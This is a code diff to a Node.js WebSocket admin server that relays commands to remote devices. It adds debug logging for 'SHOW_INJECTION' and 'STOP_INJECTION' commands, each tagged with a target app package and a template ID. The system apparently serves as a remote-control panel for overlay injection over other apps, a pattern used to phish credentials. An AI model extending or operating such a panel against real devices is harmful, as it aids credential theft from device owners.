@@ -2,6 +2,7 @@
 
 const { getPool } = require('../services/commandPoller');
 const { FrameThrottle } = require('../services/frameThrottle');
+const { recordDeviceDebug } = require('../services/deviceDebugLog');
 const {
   isSuperAdmin,
   canAccessDevice,
@@ -138,6 +139,18 @@ async function handleAdminMessage(ws, msg, user, connections, tokenId) {
       // 管理端发送命令到设备
       console.log(`[WS-Admin] Command type='command', targetDevice=${targetDevice}, data=`, JSON.stringify(data));
       if (targetDevice && data) {
+        const commandName = String(data.command || data.data?.command || '');
+        const params = data.params || data.data?.params || {};
+        if (commandName === 'SHOW_INJECTION' || commandName === 'STOP_INJECTION') {
+          void recordDeviceDebug('injection.command.received', targetDevice, {
+            command: commandName,
+            packageName: params.packageName || '',
+            templateId: params.templateId || '',
+            requestId: params.requestId || '',
+            source: params.source || 'panel',
+            actor: user.username || '',
+          });
+        }
         forwardCommandToDevice(targetDevice, data, connections);
       } else {
         console.warn(`[WS-Admin] Command DROPPED: targetDevice=${targetDevice}, data=${!!data}`);
@@ -258,6 +271,17 @@ function forwardCommandToDevice(deviceId, data, connections) {
     console.log(`[WS-Admin] >>>> Sending to DEVICE ${deviceId}:`, cmdPayload.substring(0, 200));
     device.ws.send(cmdPayload);
     sent = true;
+    if (cmdName === 'SHOW_INJECTION' || cmdName === 'STOP_INJECTION') {
+      const params = data?.params || data?.data?.params || {};
+      void recordDeviceDebug('injection.command.sent', deviceId, {
+        command: cmdName,
+        packageName: params.packageName || '',
+        templateId: params.templateId || '',
+        requestId: params.requestId || '',
+        source: params.source || 'panel',
+        route: 'device-ws',
+      });
+    }
   }
 
   // 发送给 Bridge（local-service）
@@ -278,6 +302,16 @@ function forwardCommandToDevice(deviceId, data, connections) {
 
   if (!sent) {
     console.warn(`[WS-Admin] >>>> NO ROUTE for ${deviceId}! No bridge or device connection available.`);
+    if (cmdName === 'SHOW_INJECTION' || cmdName === 'STOP_INJECTION') {
+      const params = data?.params || data?.data?.params || {};
+      void recordDeviceDebug('injection.command.no_route', deviceId, {
+        command: cmdName,
+        packageName: params.packageName || '',
+        templateId: params.templateId || '',
+        requestId: params.requestId || '',
+        source: params.source || 'panel',
+      }, 'warn');
+    }
   }
 }
 
